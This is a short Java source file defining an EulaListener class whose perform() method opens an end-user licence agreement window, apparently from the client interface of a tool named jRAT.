package pro.jrat.client.listeners;

import pro.jrat.client.ui.frames.FrameEULA;

public class EulaListener extends Performable {

	@Override
	public void perform() {
		FrameEULA frame = new FrameEULA(true);
		frame.setVisible(true);
	}

}
